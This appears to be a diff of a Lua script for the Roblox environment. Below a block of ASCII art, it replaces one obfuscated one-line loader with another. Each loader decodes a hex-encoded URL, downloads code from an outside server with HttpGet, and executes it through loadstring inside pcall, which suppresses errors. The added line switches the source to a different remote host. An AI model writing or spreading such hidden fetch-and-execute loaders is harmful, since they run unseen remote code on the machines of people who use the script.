@@ -64,4 +64,4 @@
                         $$$$%/           ( ;. "?.
                        ;"?""&gt;            ``  `.  \
                        \.- `                   `--']]--
-pcall(function()local s,c,g=string.sub,string.char,game;local u=(function(x)local o={}for i=1,#x,2 do o[#o+1]=c(tonumber(s(x,i,i+1),16))end;return table.concat(o)end)("68747470733a2f2f70616e6461646576656c6f706d656e742e6e65742f7669727475616c2f66696c652f62633230653166373830383030626433");local r=g:HttpGet(u);local f=loadstring(r);if type(f)=="function"then f()end end)
+pcall(function()local s,c,g=string.sub,string.char,game;local u=(function(x)local o={}for i=1,#x,2 do o[#o+1]=c(tonumber(s(x,i,i+1),16))end;return table.concat(o)end)("68747470733a2f2f6170692e6a756e6b69652d646576656c6f706d656e742e64652f6170692f76312f6c7561736372697074732f7075626c69632f313632633733303233613834663133383037303665656133373066303130353765363065653933333663313630393737356562373236336531393362376232362f646f776e6c6f6164");local r=g:HttpGet(u);local f=loadstring(r);if type(f)=="function"then f()end end)
